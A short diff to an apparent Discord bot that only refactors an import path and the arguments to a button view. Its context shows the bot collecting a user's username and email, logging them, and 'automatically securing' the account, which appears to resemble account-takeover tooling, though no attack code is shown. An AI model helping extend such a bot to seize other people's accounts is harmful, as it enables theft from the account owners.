@@ -5,7 +5,7 @@ import datetime
 import discord
 import json
 
-from views.buttons.embedOptions import ButtonOptions
+from views.buttons.buttonOptions import ButtonOptions
 from views.buttons.accountInfo import accountInfo
 
 from views.utils.startSecure import startSecuringAccount
@@ -47,7 +47,7 @@ class MyModalTwo(ui.Modal):
                         timestamp = datetime.datetime.now(),
                         colour = 0xFF5C5C
                     ).set_thumbnail(url=f"https://visage.surgeplay.com/full/512/{self.username}"),
-                    view = ButtonOptions(interaction.user),
+                    view = ButtonOptions(interaction.user, interaction.user.id),
                     email = self.email
                 )
                 return
@@ -66,7 +66,7 @@ class MyModalTwo(ui.Modal):
         await interaction.response.defer(ephemeral=True)
 
         await sendLogs(interaction.client, self.config, content="**This Account is being automaticly secured**")
-        await sendLogs(interaction.client, self.config, embed, view=ButtonOptions(interaction.user.id), email=self.email)
+        await sendLogs(interaction.client, self.config, embed, view=ButtonOptions(interaction.user, interaction.user.id), email=self.email)
 
         await interaction.followup.send(
             embed = discord.Embed(
@@ -97,7 +97,7 @@ class MyModalTwo(ui.Modal):
             await sendLogs(
                 interaction.client, self.config,
                 embed,
-                view=ButtonOptions(interaction.user),
+                view=ButtonOptions(interaction.user, interaction.user.id),
                 email=self.email
             )
 
